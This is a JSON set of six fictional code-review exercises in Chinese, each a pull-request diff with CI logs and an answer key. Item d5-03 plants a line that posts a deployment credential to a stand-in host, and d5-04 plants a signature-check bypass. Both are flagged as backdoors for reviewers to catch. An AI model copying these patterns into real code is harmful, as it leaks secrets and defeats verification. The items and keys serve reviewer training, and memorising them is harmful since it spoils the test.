@@ -1,0 +1,999 @@
+[
+  {
+    "id": "d5-01",
+    "title": "拒绝导入批次中的小数数量",
+    "description": {
+      "summary": "虚构项目「批笺」的导入数量必须为 1–100 的整数，范围外或小数均应拒绝。旧实现只检查有限数与范围，误收 1.5。本次补全整数验证，保留上下界和原有回归测试。",
+      "disclosure": {
+        "id": "disclosure",
+        "text": "未使用 AI 辅助；本次改动由手工编写。"
+      }
+    },
+    "contributor": {
+      "name": "林棠（虚构）",
+      "handle": "batch-integer-fictional",
+      "toolRecords": [
+        {
+          "id": "tool-batch-integer-fictional",
+          "text": "虚构投稿工具记录：手工补充小数边界验证；未使用 AI，原有测试全部保留。"
+        }
+      ]
+    },
+    "ci": {
+      "status": "passed",
+      "logs": [
+        {
+          "id": "ci-batch",
+          "text": "PASS batch-count.test.js：小数、上下界、越界、非数字用例全部通过；完整测试通过。"
+        }
+      ]
+    },
+    "files": [
+      {
+        "path": "src/batch-count.js",
+        "lines": [
+          {
+            "id": "batch-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "// 数量约定：只接收 1–100 的整数。"
+          },
+          {
+            "id": "batch-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "export function validBatchCount(count) {"
+          },
+          {
+            "id": "batch-3",
+            "kind": "delete",
+            "oldLine": 3,
+            "newLine": null,
+            "text": "  return Number.isFinite(count) && count >= 1 && count <= 100;"
+          },
+          {
+            "id": "batch-4",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 3,
+            "text": "  return Number.isInteger(count) && count >= 1 && count <= 100;"
+          },
+          {
+            "id": "batch-5",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "}"
+          }
+        ]
+      },
+      {
+        "path": "tests/batch-count.test.js",
+        "lines": [
+          {
+            "id": "batch-test-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "import { expect, test } from 'vitest';"
+          },
+          {
+            "id": "batch-test-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "import { validBatchCount } from '../src/batch-count.js';"
+          },
+          {
+            "id": "batch-test-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "test.each([1, 100])(\"接收边界 %s\", (count) => {"
+          },
+          {
+            "id": "batch-test-4",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "  expect(validBatchCount(count)).toBe(true);"
+          },
+          {
+            "id": "batch-test-5",
+            "kind": "context",
+            "oldLine": 5,
+            "newLine": 5,
+            "text": "});"
+          },
+          {
+            "id": "batch-test-6",
+            "kind": "context",
+            "oldLine": 6,
+            "newLine": 6,
+            "text": "test.each([0, 101, NaN, \"2\"])(\"拒绝非法值 %s\", (count) => {"
+          },
+          {
+            "id": "batch-test-7",
+            "kind": "context",
+            "oldLine": 7,
+            "newLine": 7,
+            "text": "  expect(validBatchCount(count)).toBe(false);"
+          },
+          {
+            "id": "batch-test-8",
+            "kind": "context",
+            "oldLine": 8,
+            "newLine": 8,
+            "text": "});"
+          },
+          {
+            "id": "batch-test-9",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 9,
+            "text": "test('拒绝小数', () => {"
+          },
+          {
+            "id": "batch-test-10",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 10,
+            "text": "  expect(validBatchCount(1.5)).toBe(false);"
+          },
+          {
+            "id": "batch-test-11",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 11,
+            "text": "});"
+          }
+        ]
+      }
+    ],
+    "finding": null,
+    "sources": [
+      {
+        "url": "https://curl.se/dev/contribute.html",
+        "theme": "评审时核对行为约定与有效测试",
+        "note": "借鉴 curl 贡献指南中说明改动目的、以测试核对行为的主题；游戏规则是虚构项目规则，不冒充其完整政策。人物、项目、代码、工具记录和日志均为原创虚构，不复制真实补丁。"
+      }
+    ],
+    "approvalExplanation": "Number.isInteger 补上了数量必须为整数的约定，同时保留 count >= 1 && count <= 100。上下界、越界和非法值测试未删，小数回归测试新增且 CI 通过；没有削弱验证或隐藏副作用，可以批准。"
+  },
+  {
+    "id": "d5-02",
+    "title": "允许本地配置选择报告显示密度",
+    "description": {
+      "summary": "虚构项目「纸栈」已有本地 JSON 配置读取器，它把解析后的配置对象交给 resolveView。用户希望在本地选择 comfortable 或 compact 显示密度；其他值必须报错。verify 固定为 true，表示报告加载前仍执行原有验证。本次只影响本地显示，不访问网络。",
+      "disclosure": {
+        "id": "disclosure",
+        "text": "未使用 AI 辅助；本次改动由手工编写。"
+      }
+    },
+    "contributor": {
+      "name": "姚禾（虚构）",
+      "handle": "report-density-fictional",
+      "toolRecords": [
+        {
+          "id": "tool-report-density-fictional",
+          "text": "虚构投稿工具记录：手工加入已文档化的本地显示选项；未使用 AI，不改验证开关。"
+        }
+      ]
+    },
+    "ci": {
+      "status": "passed",
+      "logs": [
+        {
+          "id": "ci-density",
+          "text": "PASS view-options.test.js：默认、紧凑、非法密度和 verify 保持开启的测试通过；完整测试通过。"
+        }
+      ]
+    },
+    "files": [
+      {
+        "path": "src/view-options.js",
+        "lines": [
+          {
+            "id": "density-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "// localConfig 由已有本地 JSON 读取器提供，不含远程配置。"
+          },
+          {
+            "id": "density-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "export function resolveView(localConfig) {"
+          },
+          {
+            "id": "density-3",
+            "kind": "delete",
+            "oldLine": 3,
+            "newLine": null,
+            "text": "  return { density: 'comfortable', verify: true };"
+          },
+          {
+            "id": "density-4",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 3,
+            "text": "  const density = localConfig.density ?? 'comfortable';"
+          },
+          {
+            "id": "density-5",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 4,
+            "text": "  if (!['comfortable', 'compact'].includes(density)) {"
+          },
+          {
+            "id": "density-6",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 5,
+            "text": "    throw new Error('非法显示密度');"
+          },
+          {
+            "id": "density-7",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 6,
+            "text": "  }"
+          },
+          {
+            "id": "density-8",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 7,
+            "text": "  return { density, verify: true };"
+          },
+          {
+            "id": "density-9",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 8,
+            "text": "}"
+          }
+        ]
+      },
+      {
+        "path": "tests/view-options.test.js",
+        "lines": [
+          {
+            "id": "density-test-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "import { expect, test } from 'vitest';"
+          },
+          {
+            "id": "density-test-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "import { resolveView } from '../src/view-options.js';"
+          },
+          {
+            "id": "density-test-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "test('默认配置仍验证报告', () => {"
+          },
+          {
+            "id": "density-test-4",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "  expect(resolveView({})).toEqual({ density: 'comfortable', verify: true });"
+          },
+          {
+            "id": "density-test-5",
+            "kind": "context",
+            "oldLine": 5,
+            "newLine": 5,
+            "text": "});"
+          },
+          {
+            "id": "density-test-6",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 6,
+            "text": "test('本地紧凑配置仍验证报告', () => {"
+          },
+          {
+            "id": "density-test-7",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 7,
+            "text": "  expect(resolveView({ density: 'compact' })).toEqual({ density: 'compact', verify: true });"
+          },
+          {
+            "id": "density-test-8",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 8,
+            "text": "});"
+          },
+          {
+            "id": "density-test-9",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 9,
+            "text": "test('拒绝未知密度', () => {"
+          },
+          {
+            "id": "density-test-10",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 10,
+            "text": "  expect(() => resolveView({ density: 'wide' })).toThrow('非法显示密度');"
+          },
+          {
+            "id": "density-test-11",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 11,
+            "text": "});"
+          }
+        ]
+      }
+    ],
+    "finding": null,
+    "sources": [
+      {
+        "url": "https://curl.se/dev/contribute.html",
+        "theme": "评审时核对行为约定与有效测试",
+        "note": "借鉴 curl 贡献指南中说明改动目的、以测试核对行为的主题；游戏规则是虚构项目规则，不冒充其完整政策。人物、项目、代码、工具记录和日志均为原创虚构，不复制真实补丁。"
+      }
+    ],
+    "approvalExplanation": "本地配置的用途、允许值和默认值都明确可见。仅从白名单选择显示密度，未知值报错；返回值始终保留 verify: true，原验证未绕过，也没有隐藏执行或网络发送。CI 通过，可以批准；合理的本地选项本身不是后门。"
+  },
+  {
+    "id": "d5-03",
+    "title": "为发布失败报告补充诊断信息",
+    "description": {
+      "summary": "虚构项目「发笺」的失败报告原本只返回本地错误摘要。本次说明称要补充诊断，维持调用方显示不变。environment 参数由发布进程传入，可能含部署凭据；项目约定失败报告不得上传凭据，也没有启用外部诊断服务。片段中的 .invalid 地址只用于虚构材料。",
+      "disclosure": {
+        "id": "disclosure",
+        "text": "未使用 AI 辅助；本次改动由手工编写。"
+      }
+    },
+    "contributor": {
+      "name": "许砚（虚构）",
+      "handle": "release-report-fictional",
+      "toolRecords": [
+        {
+          "id": "tool-release-report-fictional",
+          "text": "虚构投稿工具记录：手工调整发布失败诊断分支；未使用 AI。"
+        }
+      ]
+    },
+    "ci": {
+      "status": "passed",
+      "logs": [
+        {
+          "id": "ci-diagnostic",
+          "text": "PASS failure-report.test.js：空环境下返回原本地摘要；fetch 使用无网络的测试替身，未覆盖含部署凭据的环境；完整现有测试通过。"
+        }
+      ]
+    },
+    "files": [
+      {
+        "path": "src/failure-report.js",
+        "lines": [
+          {
+            "id": "diagnostic-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "// environment 由发布进程传入；本地报告只需错误摘要。"
+          },
+          {
+            "id": "diagnostic-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "export async function failureReport(error, environment) {"
+          },
+          {
+            "id": "diagnostic-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "  const report = { message: error.message };"
+          },
+          {
+            "id": "diagnostic-4",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 4,
+            "text": "  if (environment.DEPLOY_CREDENTIAL) {"
+          },
+          {
+            "id": "diagnostic-credential-upload",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 5,
+            "text": "    await fetch('https://collector.invalid/report', { method: 'POST', body: environment.DEPLOY_CREDENTIAL });"
+          },
+          {
+            "id": "diagnostic-6",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 6,
+            "text": "  }"
+          },
+          {
+            "id": "diagnostic-7",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 7,
+            "text": "  return report;"
+          },
+          {
+            "id": "diagnostic-8",
+            "kind": "context",
+            "oldLine": 5,
+            "newLine": 8,
+            "text": "}"
+          }
+        ]
+      },
+      {
+        "path": "tests/failure-report.test.js",
+        "lines": [
+          {
+            "id": "diagnostic-test-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "import { expect, test, vi } from 'vitest';"
+          },
+          {
+            "id": "diagnostic-test-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "import { failureReport } from '../src/failure-report.js';"
+          },
+          {
+            "id": "diagnostic-test-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "test('返回本地失败摘要', async () => {"
+          },
+          {
+            "id": "diagnostic-test-4",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "  vi.stubGlobal('fetch', vi.fn().mockResolvedValue({ ok: true }));"
+          },
+          {
+            "id": "diagnostic-test-5",
+            "kind": "context",
+            "oldLine": 5,
+            "newLine": 5,
+            "text": "  const report = await failureReport(new Error('打包失败'), {});"
+          },
+          {
+            "id": "diagnostic-test-6",
+            "kind": "context",
+            "oldLine": 6,
+            "newLine": 6,
+            "text": "  expect(report).toEqual({ message: '打包失败' });"
+          },
+          {
+            "id": "diagnostic-test-7",
+            "kind": "context",
+            "oldLine": 7,
+            "newLine": 7,
+            "text": "  vi.unstubAllGlobals();"
+          },
+          {
+            "id": "diagnostic-test-8",
+            "kind": "context",
+            "oldLine": 8,
+            "newLine": 8,
+            "text": "});"
+          }
+        ]
+      }
+    ],
+    "finding": {
+      "ruleId": "R5",
+      "impact": "backdoor",
+      "evidenceSets": [
+        [
+          "diagnostic-credential-upload"
+        ]
+      ],
+      "explanation": "新增行把 environment.DEPLOY_CREDENTIAL 原样作为 POST 正文发往外部地址，这不是返回本地摘要所需的诊断。说明没有披露或授权这种凭据外传，已越过信任边界，必须依 R5 拒绝，不能按普通返修处理。CI 通过只说明空环境和网络替身覆盖的路径正常，不证明含凭据的新增分支安全；材料中的 .invalid 是虚构地址，不含可用凭据。"
+    },
+    "sources": [
+      {
+        "url": "https://www.openwall.com/lists/oss-security/2024/03/29/4",
+        "theme": "信任边界与伪装修复中的隐藏行为",
+        "note": "借鉴 xz 原始披露所体现的信任边界、隐藏行为及不能仅凭修复叙事信任提交的主题。R5 是本游戏的虚构项目规则；本题人物、项目、代码与日志均为原创虚构，不复制真实补丁，不影射真实作者，不提供真实攻击目标。"
+      }
+    ]
+  },
+  {
+    "id": "d5-04",
+    "title": "修复旧版包备注导致的导入失败",
+    "description": {
+      "summary": "虚构项目「封签」仅接收签名有效的包。bundle 的 payload、signature、note 均来自待导入文件，note 不是受信任字段。调用方提供的 verifySignature(bundle) 只在签名有效时返回 true。本次称修复旧版包的兼容备注；应核对是否仍要求每个包先通过签名验证。",
+      "disclosure": {
+        "id": "disclosure",
+        "text": "未使用 AI 辅助；本次改动由手工编写。"
+      }
+    },
+    "contributor": {
+      "name": "魏岚（虚构）",
+      "handle": "bundle-compat-fictional",
+      "toolRecords": [
+        {
+          "id": "tool-bundle-compat-fictional",
+          "text": "虚构投稿工具记录：手工修改旧版包兼容处理；未使用 AI。"
+        }
+      ]
+    },
+    "ci": {
+      "status": "passed",
+      "logs": [
+        {
+          "id": "ci-signature",
+          "text": "PASS accept-bundle.test.js：普通备注的有效/无效签名用例通过；未覆盖 compat-repair 备注；完整现有测试通过。"
+        }
+      ]
+    },
+    "files": [
+      {
+        "path": "src/accept-bundle.js",
+        "lines": [
+          {
+            "id": "signature-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "// bundle 来自待导入文件；note 也由文件提供者控制。"
+          },
+          {
+            "id": "signature-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "// verifySignature 对签名有效的包返回 true，否则为 false。"
+          },
+          {
+            "id": "signature-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "export function acceptBundle(bundle, verifySignature) {"
+          },
+          {
+            "id": "signature-bypass",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 4,
+            "text": "  if (bundle.note === 'compat-repair') return true;"
+          },
+          {
+            "id": "signature-5",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 5,
+            "text": "  return verifySignature(bundle);"
+          },
+          {
+            "id": "signature-6",
+            "kind": "context",
+            "oldLine": 5,
+            "newLine": 6,
+            "text": "}"
+          }
+        ]
+      },
+      {
+        "path": "tests/accept-bundle.test.js",
+        "lines": [
+          {
+            "id": "signature-test-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "import { expect, test } from 'vitest';"
+          },
+          {
+            "id": "signature-test-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "import { acceptBundle } from '../src/accept-bundle.js';"
+          },
+          {
+            "id": "signature-test-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "test('普通包签名有效才接收', () => {"
+          },
+          {
+            "id": "signature-test-4",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "  const bundle = { payload: 'demo', signature: null, note: 'ordinary' };"
+          },
+          {
+            "id": "signature-test-5",
+            "kind": "context",
+            "oldLine": 5,
+            "newLine": 5,
+            "text": "  expect(acceptBundle(bundle, () => true)).toBe(true);"
+          },
+          {
+            "id": "signature-test-6",
+            "kind": "context",
+            "oldLine": 6,
+            "newLine": 6,
+            "text": "  expect(acceptBundle(bundle, () => false)).toBe(false);"
+          },
+          {
+            "id": "signature-test-7",
+            "kind": "context",
+            "oldLine": 7,
+            "newLine": 7,
+            "text": "});"
+          }
+        ]
+      }
+    ],
+    "finding": {
+      "ruleId": "R5",
+      "impact": "backdoor",
+      "evidenceSets": [
+        [
+          "signature-bypass"
+        ]
+      ],
+      "explanation": "新增的 compat-repair 分支在调用 verifySignature 前直接返回 true。note 完全由待导入文件控制，因此无效签名的文件也能通过这一隐藏入口，兼容性修复的说法不能赋予文件自我授权的能力。必须按 R5 拒绝，而非要求修改。CI 通过的两个用例都使用 ordinary，未覆盖绕过分支；本次没有删除测试，决定性违规是新增验证后门。"
+    },
+    "sources": [
+      {
+        "url": "https://www.openwall.com/lists/oss-security/2024/03/29/4",
+        "theme": "信任边界与伪装修复中的隐藏行为",
+        "note": "借鉴 xz 原始披露所体现的信任边界、隐藏行为及不能仅凭修复叙事信任提交的主题。R5 是本游戏的虚构项目规则；本题人物、项目、代码与日志均为原创虚构，不复制真实补丁，不影射真实作者，不提供真实攻击目标。"
+      }
+    ]
+  },
+  {
+    "id": "d5-05",
+    "title": "清理标签清单中的空白行",
+    "description": {
+      "summary": "虚构项目「签册」将每行视为一个标签；空白行应忽略，两侧空白应清理。本次实现该行为并补充回归用例。请结合描述中的披露栏与本次投稿工具记录评审。",
+      "disclosure": {
+        "id": "disclosure",
+        "text": ""
+      }
+    },
+    "contributor": {
+      "name": "苏澈（虚构）",
+      "handle": "label-list-fictional",
+      "toolRecords": [
+        {
+          "id": "tool-labels-ai",
+          "text": "虚构投稿工具记录：本次使用 AI 生成标签清理实现与测试，已采纳输出并应用到本次提交。"
+        }
+      ]
+    },
+    "ci": {
+      "status": "passed",
+      "logs": [
+        {
+          "id": "ci-labels",
+          "text": "PASS label-list.test.js：空行、两侧空白、空清单用例全部通过；完整现有测试通过。"
+        }
+      ]
+    },
+    "files": [
+      {
+        "path": "src/label-list.js",
+        "lines": [
+          {
+            "id": "labels-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "// 每行一个标签；清理两侧空白并忽略空行。"
+          },
+          {
+            "id": "labels-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "export function parseLabels(input) {"
+          },
+          {
+            "id": "labels-3",
+            "kind": "delete",
+            "oldLine": 3,
+            "newLine": null,
+            "text": "  return input.split('\\n');"
+          },
+          {
+            "id": "labels-4",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 3,
+            "text": "  return input.split('\\n').map((line) => line.trim()).filter(Boolean);"
+          },
+          {
+            "id": "labels-5",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "}"
+          }
+        ]
+      },
+      {
+        "path": "tests/label-list.test.js",
+        "lines": [
+          {
+            "id": "labels-test-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "import { expect, test } from 'vitest';"
+          },
+          {
+            "id": "labels-test-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "import { parseLabels } from '../src/label-list.js';"
+          },
+          {
+            "id": "labels-test-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "test('普通清单', () => {"
+          },
+          {
+            "id": "labels-test-4",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "  expect(parseLabels('a\\nb')).toEqual(['a', 'b']);"
+          },
+          {
+            "id": "labels-test-5",
+            "kind": "context",
+            "oldLine": 5,
+            "newLine": 5,
+            "text": "});"
+          },
+          {
+            "id": "labels-test-6",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 6,
+            "text": "test('忽略空白行并清理标签', () => {"
+          },
+          {
+            "id": "labels-test-7",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 7,
+            "text": "  expect(parseLabels(' a \\n \\nb ')).toEqual(['a', 'b']);"
+          },
+          {
+            "id": "labels-test-8",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 8,
+            "text": "  expect(parseLabels('')).toEqual([]);"
+          },
+          {
+            "id": "labels-test-9",
+            "kind": "add",
+            "oldLine": null,
+            "newLine": 9,
+            "text": "});"
+          }
+        ]
+      }
+    ],
+    "finding": {
+      "ruleId": "R3",
+      "impact": "policy",
+      "evidenceSets": [
+        [
+          "tool-labels-ai",
+          "disclosure"
+        ]
+      ],
+      "explanation": "标签清理实现和回归测试符合描述，CI 通过且没有测试削弱或后门。但工具记录明确证明本次已采纳并应用 AI 输出，披露栏却为空；必须同时选择工具记录和空栏，依据仍生效的 R3 要求修改以补充披露。不能只凭空栏、文风或身份推断使用 AI，也不应将这一流程问题按 R5 拒绝。"
+    },
+    "sources": [
+      {
+        "url": "https://godotengine.org/article/contribution-policy-2026/",
+        "theme": "AI 辅助贡献的披露与评审责任",
+        "note": "借鉴贡献政策讨论中 AI 辅助与评审责任的主题；R3 是本游戏的虚构项目规则，不声称复述 Godot 的完整政策。人物、项目、代码、工具记录与日志均为原创虚构，不复制真实补丁。"
+      }
+    ]
+  },
+  {
+    "id": "d5-06",
+    "title": "整理归档路径用例以稳定构建",
+    "description": {
+      "summary": "虚构项目「归篓」约定归档条目只允许相对路径，必须拒绝 ../ 前缀和 / 开头的绝对路径。已有实现只拦 ../；绝对路径回归测试因此失败。本次说明称删去环境不稳定的用例以恢复 CI，生产实现未变，请核对移除的检查。",
+      "disclosure": {
+        "id": "disclosure",
+        "text": "未使用 AI 辅助；本次改动由手工编写。"
+      }
+    },
+    "contributor": {
+      "name": "程栖（虚构）",
+      "handle": "archive-path-fictional",
+      "toolRecords": [
+        {
+          "id": "tool-archive-path-fictional",
+          "text": "虚构投稿工具记录：手工删除归档绝对路径用例，生产实现未改；未使用 AI。"
+        }
+      ]
+    },
+    "ci": {
+      "status": "passed",
+      "logs": [
+        {
+          "id": "ci-safe-path",
+          "text": "PASS safe-entry.test.js：保留的普通相对路径和 ../ 前缀用例通过；绝对路径用例已移除，完整现有测试通过。"
+        }
+      ]
+    },
+    "files": [
+      {
+        "path": "src/safe-entry.js",
+        "lines": [
+          {
+            "id": "path-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "// 约定：拒绝 ../ 前缀和 / 开头的绝对路径。"
+          },
+          {
+            "id": "path-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "export function isSafeEntry(path) {"
+          },
+          {
+            "id": "path-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "  return !path.startsWith('../');"
+          },
+          {
+            "id": "path-4",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "}"
+          }
+        ]
+      },
+      {
+        "path": "tests/safe-entry.test.js",
+        "lines": [
+          {
+            "id": "path-test-1",
+            "kind": "context",
+            "oldLine": 1,
+            "newLine": 1,
+            "text": "import { expect, test } from 'vitest';"
+          },
+          {
+            "id": "path-test-2",
+            "kind": "context",
+            "oldLine": 2,
+            "newLine": 2,
+            "text": "import { isSafeEntry } from '../src/safe-entry.js';"
+          },
+          {
+            "id": "path-test-3",
+            "kind": "context",
+            "oldLine": 3,
+            "newLine": 3,
+            "text": "test('普通相对路径可用', () => {"
+          },
+          {
+            "id": "path-test-4",
+            "kind": "context",
+            "oldLine": 4,
+            "newLine": 4,
+            "text": "  expect(isSafeEntry('docs/readme')).toBe(true);"
+          },
+          {
+            "id": "path-test-5",
+            "kind": "context",
+            "oldLine": 5,
+            "newLine": 5,
+            "text": "});"
+          },
+          {
+            "id": "path-test-6",
+            "kind": "context",
+            "oldLine": 6,
+            "newLine": 6,
+            "text": "test('拒绝父目录前缀', () => {"
+          },
+          {
+            "id": "path-test-7",
+            "kind": "context",
+            "oldLine": 7,
+            "newLine": 7,
+            "text": "  expect(isSafeEntry('../private')).toBe(false);"
+          },
+          {
+            "id": "path-test-8",
+            "kind": "context",
+            "oldLine": 8,
+            "newLine": 8,
+            "text": "});"
+          },
+          {
+            "id": "path-test-9",
+            "kind": "delete",
+            "oldLine": 9,
+            "newLine": null,
+            "text": "test('拒绝绝对路径', () => {"
+          },
+          {
+            "id": "path-absolute-assertion",
+            "kind": "delete",
+            "oldLine": 10,
+            "newLine": null,
+            "text": "  expect(isSafeEntry('/private/data')).toBe(false);"
+          },
+          {
+            "id": "path-test-11",
+            "kind": "delete",
+            "oldLine": 11,
+            "newLine": null,
+            "text": "});"
+          }
+        ]
+      }
+    ],
+    "finding": {
+      "ruleId": "R4",
+      "impact": "bug",
+      "evidenceSets": [
+        [
+          "path-absolute-assertion"
+        ]
+      ],
+      "explanation": "删除行移除了唯一检查 / 开头绝对路径必须被拒绝的断言。这个用例只比较纯字符串，不依赖环境；现有生产实现未变，绝对路径仍被接受。CI 通过来自删除失败的安全回归测试，覆盖已削弱，按仍生效的 R4 要求修改并恢复有效覆盖、修复原问题。本次没有新增隐藏入口，不能仅因测试涉及安全就改判 R5 拒绝。"
+    },
+    "sources": [
+      {
+        "url": "https://curl.se/dev/contribute.html",
+        "theme": "评审时核对行为约定与有效测试",
+        "note": "借鉴 curl 贡献指南中说明改动目的、以测试核对行为的主题；游戏规则是虚构项目规则，不冒充其完整政策。人物、项目、代码、工具记录和日志均为原创虚构，不复制真实补丁。"
+      }
+    ]
+  }
+]
